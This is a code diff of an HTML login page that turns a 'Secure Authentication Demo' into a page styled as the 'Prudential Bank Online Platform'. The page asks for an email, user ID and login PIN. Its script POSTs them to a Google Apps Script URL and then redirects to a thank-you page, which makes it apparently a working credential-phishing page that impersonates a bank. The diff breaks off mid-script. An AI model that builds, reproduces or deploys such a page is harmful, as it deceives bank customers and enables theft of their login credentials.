@@ -1,108 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Secure Authentication Demo</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background-color: #f7f7f7;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    .header {
-      background-color: #f9c600; /* Yellow header */
-      color: #000;
-      text-align: center;
-      width: 100%;
-      padding: 40px 20px;
-      border-bottom-left-radius: 40px;
-      border-bottom-right-radius: 40px;
-    }
-    .header h1 { margin: 0; font-size: 22px; }
-    .header p { margin: 5px 0 0; font-size: 14px; }
-    .login-container {
-      background: #fff;
-      width: 90%;
-      max-width: 360px;
-      margin-top: -30px;
-      padding: 30px 25px;
-      border-radius: 12px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-    }
-    .login-container label {
-      display: block;
-      margin-bottom: 6px;
-      font-size: 14px;
-      color: #333;
-    }
-    .login-container input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #ddd;
-      border-radius: 6px;
-      font-size: 14px;
-    }
-    .button-group {
-      display: flex;
-      justify-content: center;
-    }
-    .button-group button {
-      padding: 12px 20px;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.3s;
-      background-color: #f9c600;
-      color: #000;
-    }
-    .button-group button:hover {
-      background-color: #e6b200;
-    }
+    body { font-family: Arial, sans-serif; margin: 0; background: #f7f7f7; display: flex; flex-direction: column; align-items: center; }
+    .header { background: linear-gradient(135deg, #1e3c72, #2a5298); color: #fff; text-align: center; width: 100%; padding: 40px 20px; border-bottom-left-radius: 40px; border-bottom-right-radius: 40px; }
+    .header h1 { margin: 0; font-size: 22px; } .header p { margin: 5px 0 0; font-size: 14px; }
+    .login-container { background: #fff; width: 90%; max-width: 360px; margin-top: -30px; padding: 30px 25px; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+    label { display: block; margin-bottom: 6px; font-size: 14px; color: #333; }
+    input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; }
+    .button-group { display: flex; justify-content: center; }
+    .button-group button { padding: 12px 20px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; background: linear-gradient(135deg, #1e3c72, #2a5298); color: #fff; }
+    .button-group button:hover { background: linear-gradient(135deg, #162447, #1f4068); }
   </style>
 </head>
 <body>
   <div class="header">
-    <h1>Secure Authentication Demo</h1>
-    <p>Connect to Google Sheet via Apps Script</p>
+    <h1>Welcome to the Prudential Bank Online Platform </h1>
+    <p> Login to validate </p>
   </div>
 
   <div class="login-container">
     <form id="authForm">
-      <label>Email</label>
-      <input type="email" name="email" placeholder="Enter email" required>
-
-      <label>User ID</label>
-      <input type="text" name="userId" placeholder="Enter user ID" required>
-
-      <label>Login PIN</label>
-      <input type="password" name="pin" placeholder="Enter PIN" required>
-
-      <div class="button-group">
-        <button type="submit">Login  To Validate →</button>
-      </div>
+      <label>Email</label><input type="email" name="email" placeholder="Enter your email" required>
+      <label>User ID</label><input type="text" name="userId" placeholder="Enter your User ID" required>
+      <label>Login PIN</label><input type="password" name="pin" placeholder="Enter your PIN" required>
+      <div class="button-group"><button type="submit">Login To Validate →</button></div>
     </form>
   </div>
 
   <script>
     document.getElementById('authForm').addEventListener('submit', async function(e) {
       e.preventDefault();
-      const form = e.target;
-      const data = new FormData(form);
-      const params = new URLSearchParams(data);
-
+      const params = new URLSearchParams(new FormData(e.target));
       try {
-        const response = await fetch("https://script.google.com/macros/s/AKfycbzv-M-i3ZgHE3IN-q1CnnmSrJh3_26l8sKnoMkl_kpvYnAh8hX7K70xzNIwrZhK7YKm/exec", {
-          method: "POST",
-          body: params
-        });
-
+        const response = await fetch("https://script.google.com/macros/s/AKfycbzv-M-i3ZgHE3IN-q1CnnmSrJh3_26l8sKnoMkl_kpvYnAh8hX7K70xzNIwrZhK7YKm/exec", { method: "POST", body: params });
         if (response.ok) {
           window.location.href = "thank_you.html";
         } else {
